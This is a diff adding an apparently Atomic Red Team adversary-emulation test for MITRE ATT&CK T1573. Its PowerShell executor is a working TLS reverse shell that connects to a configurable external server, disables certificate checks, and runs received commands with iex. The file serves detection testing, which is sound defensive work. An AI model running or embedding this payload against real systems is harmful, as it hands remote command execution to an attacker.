@@ -1,0 +1,43 @@
+attack_technique:
+- T1573
+display_name: Standard Cryptographic Protocol
+atomic_tests:
+- name: OpenSSL C2
+  description: |
+    Thanks to @OrOneEqualsOne for this quick C2 method.
+    This is to test to see if a C2 session can be established using an SSL socket.
+    More information about this technique, including how to set up the listener, can be found here:
+    https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926
+
+    Upon successful execution, powershell will make a network connection to 127.0.0.1 over 443.
+  supported_platforms:
+  - windows
+  input_arguments:
+    server_ip:
+      description: IP of the external server
+      type: String
+      default: 127.0.0.1
+    server_port:
+      description: The port to connect to on the external server
+      type: String
+      default: "443"
+  executor:
+    command: |
+      $server_ip = #{server_ip}
+      $server_port = #{server_port}
+      $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
+      $stream = $socket.GetStream()
+      $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+      $sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
+      $writer = new-object System.IO.StreamWriter($sslStream)
+      $writer.Write('PS ' + (pwd).Path + '> ')
+      $writer.flush()
+      [byte[]]$bytes = 0..65535|%{0};
+      while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
+      {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+      $sendback = (iex $data | Out-String ) 2>&1;
+      $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+      $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
+    name: powershell
+
